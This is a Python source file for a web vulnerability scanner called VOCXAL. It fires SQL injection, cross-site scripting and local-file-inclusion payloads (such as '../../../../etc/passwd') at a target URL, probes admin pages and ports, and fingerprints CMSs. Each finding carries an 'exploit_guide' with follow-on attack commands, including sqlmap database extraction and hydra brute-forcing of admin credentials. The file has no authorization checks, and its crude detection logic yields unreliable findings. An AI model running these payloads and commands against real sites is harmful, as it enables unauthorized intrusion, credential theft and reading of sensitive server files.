#!/usr/bin/env python3
"""
VOCXAL Scanner Engine - Core scanning logic
"""

import requests
import socket
import re
from urllib.parse import urljoin, urlparse
import time

class VulnerabilityScanner:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'VOCXAL-Security-Scanner/1.0'
        })
        self.timeout = 10
    
    def scan_sqli(self, target_url):
        """SQL Injection Scanner"""
        results = {'vulnerable': False, 'details': [], 'exploit_guide': []}
        
        # Test payloads
        payloads = [
            "' OR '1'='1",
            "' UNION SELECT NULL--",
            "' AND SLEEP(5)--",
            "\" OR \"1\"=\"1"
        ]
        
        for payload in payloads:
            try:
                test_url = f"{target_url}?id={payload}"
                start = time.time()
                r = self.session.get(test_url, timeout=self.timeout)
                elapsed = time.time() - start
                
                if "mysql" in r.text.lower() or "sql" in r.text.lower():
                    results['vulnerable'] = True
                    results['details'].append(f"SQLi detected with payload: {payload}")
                    results['exploit_guide'].append({
                        'method': 'Union-based SQLi',
                        'command': f"sqlmap -u '{target_url}?id=1' --dbs --batch",
                        'description': 'Extract database information'
                    })
                
                if elapsed > 4:
                    results['vulnerable'] = True
                    results['details'].append(f"Time-based SQLi detected")
                    results['exploit_guide'].append({
                        'method': 'Time-based Blind SQLi',
                        'command': f"sqlmap -u '{target_url}?id=1' --technique=T --dbs",
                        'description': 'Extract data using time delays'
                    })
            except:
                pass
        
        return results
    
    def scan_xss(self, target_url):
        """XSS Vulnerability Scanner"""
        results = {'vulnerable': False, 'details': [], 'exploit_guide': []}
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert('XSS')"
        ]
        
        for payload in xss_payloads:
            try:
                test_url = f"{target_url}?q={payload}"
                r = self.session.get(test_url, timeout=self.timeout)
                
                if payload in r.text or payload.lower() in r.text.lower():
                    results['vulnerable'] = True
                    results['details'].append(f"XSS detected: {payload}")
                    results['exploit_guide'].append({
                        'method': 'Reflected XSS',
                        'command': f"curl '{test_url}'",
                        'description': 'Execute JavaScript in victim browser'
                    })
            except:
                pass
        
        return results
    
    def scan_lfi(self, target_url):
        """Local File Inclusion Scanner"""
        results = {'vulnerable': False, 'details': [], 'exploit_guide': []}
        
        lfi_payloads = [
            "../../../../etc/passwd",
            "../../../windows/win.ini",
            "php://filter/convert.base64-encode/resource=index.php"
        ]
        
        for payload in lfi_payloads:
            try:
                test_url = f"{target_url}?page={payload}"
                r = self.session.get(test_url, timeout=self.timeout)
                
                if "root:x:" in r.text or "fonts" in r.text:
                    results['vulnerable'] = True
                    results['details'].append(f"LFI detected: {payload}")
                    results['exploit_guide'].append({
                        'method': 'Local File Inclusion',
                        'command': f"curl '{test_url}'",
                        'description': 'Read sensitive files from server'
                    })
            except:
                pass
        
        return results
    
    def find_admin_panels(self, target_url):
        """Find Admin Panels"""
        results = {'found': [], 'exploit_guide': []}
        
        admin_paths = [
            'admin', 'administrator', 'admin.php', 'admin/login',
            'wp-admin', 'dashboard', 'controlpanel', 'adminpanel'
        ]
        
        for path in admin_paths:
            test_url = urljoin(target_url, path)
            try:
                r = self.session.get(test_url, timeout=self.timeout)
                if r.status_code == 200:
                    results['found'].append(test_url)
                    results['exploit_guide'].append({
                        'method': 'Admin Panel Found',
                        'command': f"hydra -l admin -P passwords.txt {test_url} http-post-form",
                        'description': 'Bruteforce admin credentials'
                    })
            except:
                pass
        
        return results
    
    def scan_ports(self, target_url):
        """Basic Port Scanner"""
        results = {'open_ports': [], 'exploit_guide': []}
        
        common_ports = [21, 22, 80, 443, 3306, 5432, 8080, 8443]
        hostname = urlparse(target_url).hostname
        
        for port in common_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((hostname, port))
                if result == 0:
                    results['open_ports'].append(port)
                    results['exploit_guide'].append({
                        'method': f'Port {port} Open',
                        'command': f'nmap -p {port} -sV {hostname}',
                        'description': f'Scan service version on port {port}'
                    })
                sock.close()
            except:
                pass
        
        return results
    
    def detect_cms(self, target_url):
        """CMS Detection"""
        results = {'cms': None, 'exploit_guide': []}
        
        cms_signatures = {
            'WordPress': ['/wp-content/', '/wp-includes/', 'wp-json'],
            'Joomla': ['/media/system/js/', 'com_content'],
            'Drupal': ['/misc/drupal.js', 'sites/default'],
            'Laravel': ['laravel_session', 'csrf-token']
        }
        
        try:
            r = self.session.get(target_url, timeout=self.timeout)
            
            for cms, signatures in cms_signatures.items():
                for sig in signatures:
                    if sig in r.text:
                        results['cms'] = cms
                        results['exploit_guide'].append({
                            'method': f'{cms} Specific Exploit',
                            'command': f'searchsploit {cms.lower()}',
                            'description': f'Find exploits for {cms}'
                        })
                        break
        except:
            pass
        
        return results